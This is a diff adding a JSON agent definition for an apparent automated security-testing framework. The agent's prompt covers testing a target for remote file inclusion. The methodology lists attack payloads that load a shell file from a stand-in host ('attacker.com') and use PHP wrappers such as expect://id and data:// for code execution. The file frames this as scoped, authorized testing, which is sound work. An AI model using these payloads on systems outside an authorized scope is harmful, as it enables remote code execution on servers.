@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/rfi",
+  "version": "1.0.0",
+  "title": "Remote File Inclusion Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-98"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "restricted",
+  "methodology": "# Remote File Inclusion Specialist Agent\n\n## User Prompt\nYou are testing **{target}** for Remote File Inclusion (RFI).\n\n**Recon Context:**\n{recon_json}\n\n**METHODOLOGY:**\n\n### 1. Identify Inclusion Parameters\n- Same as LFI parameters: `page=`, `file=`, `include=`, `url=`, `path=`\n- RFI requires `allow_url_include=On` (PHP) or similar config\n\n### 2. RFI Payloads\n- `http://attacker.com/shell.txt` (PHP code without .php extension)\n- `https://attacker.com/shell.txt`\n- `ftp://attacker.com/shell.txt`\n- `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==` (base64 phpinfo)\n- `expect://id` (if expect wrapper enabled)\n\n### 3. Detection Without External Server\n- Use `http://127.0.0.1/` to test if URL inclusion works\n- Use `data://` wrapper for self-contained proof\n- Test `php://input` with POST body\n\n### 4. Report\n```\nFINDING:\n- Title: Remote File Inclusion in [parameter] at [endpoint]\n- Severity: Critical\n- CWE: CWE-98\n- Endpoint: [URL]\n- Payload: [exact RFI payload]\n- Evidence: [remote file content executed/included]\n- Impact: Remote Code Execution\n- Remediation: Disable allow_url_include, use allowlist, validate input\n```\n\n## System Prompt\nYou are an RFI specialist. RFI is critical severity as it leads directly to RCE. Confirm by showing that a remote resource was actually fetched and included/executed by the server. Use safe payloads (phpinfo, echo) not destructive ones.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/rfi.md",
+  "warnings": []
+}
